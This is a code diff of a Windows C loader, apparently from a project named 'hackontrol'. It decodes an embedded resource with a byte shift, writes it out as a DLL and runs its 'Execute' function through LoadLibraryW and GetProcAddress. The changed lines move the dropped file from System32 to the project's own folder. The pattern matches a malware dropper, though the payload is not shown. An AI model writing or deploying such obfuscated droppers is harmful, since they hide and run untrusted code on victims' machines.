@@ -1,12 +1,14 @@
 #include <stdio.h>
 #include <khopanwin32.h>
 #include <khopanstring.h>
+#include <hackontrol.h>
 #include "resource.h"
 
 #define FREE(x) if(LocalFree(x)) KHWin32ConsoleErrorW(GetLastError(), L"LocalFree")
 
-#define FILE_LIBDLL32     L"libdll32.dll"
-#define FUNCTION_LIBDLL32 L"Execute"
+#define FUNCTION_LIBDLL32 "Execute"
+
+typedef void(__stdcall* Rundll32Function) (HWND window, HINSTANCE instance, LPSTR argument, int command);
 
 int main(int argc, char** argv) {
 	printf("Finding resource\n");
@@ -52,19 +54,19 @@ int main(int argc, char** argv) {
 		buffer[i] = (data[i] - 18) % 0xFF;
 	}
 
-	LPWSTR pathFolderWindows = KHWin32GetWindowsDirectoryW();
+	LPWSTR pathFolderHackontrol = GetHackontrolDirectory();
 
-	if(!pathFolderWindows) {
-		KHWin32ConsoleErrorW(GetLastError(), L"KHWin32GetWindowsDirectoryW");
+	if(!pathFolderHackontrol) {
+		KHWin32ConsoleErrorW(GetLastError(), L"GetHackontrolDirectory");
 		FREE(buffer);
 		return 1;
 	}
 
-	LPWSTR pathFileLibdll32 = KHFormatMessageW(L"%ws\\" FOLDER_SYSTEM32 L"\\" FILE_LIBDLL32, pathFolderWindows);
-	FREE(pathFolderWindows);
+	LPWSTR pathFileLibdll32 = KHFormatMessageW(L"%ws\\" FILE_LIBDLL32, pathFolderHackontrol);
+	FREE(pathFolderHackontrol);
 
 	if(!pathFileLibdll32) {
-		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
+		KHWin32ConsoleErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
 		FREE(buffer);
 		return 1;
 	}
@@ -73,7 +75,7 @@ int main(int argc, char** argv) {
 	HANDLE file = CreateFileW(pathFileLibdll32, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 
 	if(file == INVALID_HANDLE_VALUE) {
-		KHWin32DialogErrorW(GetLastError(), L"CreateFileW");
+		KHWin32ConsoleErrorW(GetLastError(), L"CreateFileW");
 		FREE(pathFileLibdll32);
 		FREE(buffer);
 		return 1;
@@ -84,7 +86,7 @@ int main(int argc, char** argv) {
 	FREE(buffer);
 	
 	if(!result) {
-		KHWin32DialogErrorW(GetLastError(), L"WriteFile");
+		KHWin32ConsoleErrorW(GetLastError(), L"WriteFile");
 		FREE(pathFileLibdll32);
 		return 1;
 	}
@@ -92,23 +94,38 @@ int main(int argc, char** argv) {
 	printf("Size:    %lu byte(s)\nWritten: %lu byte(s)\n", resourceSize, written);
 
 	if(resourceSize != written) {
-		printf("Error: Resource size mismatch\n");
+		KHWin32ConsoleErrorW(ERROR_FUNCTION_FAILED, L"WriteFile");
 		FREE(pathFileLibdll32);
 		return 1;
 	}
 
 	if(!CloseHandle(file)) {
-		KHWin32DialogErrorW(GetLastError(), L"CloseHandle");
+		KHWin32ConsoleErrorW(GetLastError(), L"CloseHandle");
 		FREE(pathFileLibdll32);
 		return 1;
 	}
 
-	printf("File closed\n");
-	result = KHWin32StartDynamicLibraryW(pathFileLibdll32, FUNCTION_LIBDLL32, NULL);
+	printf("File closed\nLoading DLL\n");
+	HMODULE module = LoadLibraryW(pathFileLibdll32);
 	FREE(pathFileLibdll32);
 
-	if(!result) {
-		KHWin32DialogErrorW(GetLastError(), L"KHWin32StartDynamicLibraryW");
+	if(!module) {
+		KHWin32ConsoleErrorW(GetLastError(), L"LoadLibraryW");
+		return 1;
+	}
+
+	Rundll32Function function = (Rundll32Function) GetProcAddress(module, FUNCTION_LIBDLL32);
+
+	if(!function) {
+		KHWin32ConsoleErrorW(GetLastError(), L"GetProcAddress");
+		goto freeLibrary;
+	}
+
+	function(NULL, NULL, NULL, 0);
+	printf("Finished\n");
+freeLibrary:
+	if(!FreeLibrary(module)) {
+		KHWin32ConsoleErrorW(GetLastError(), L"FreeLibrary");
 		return 1;
 	}
 
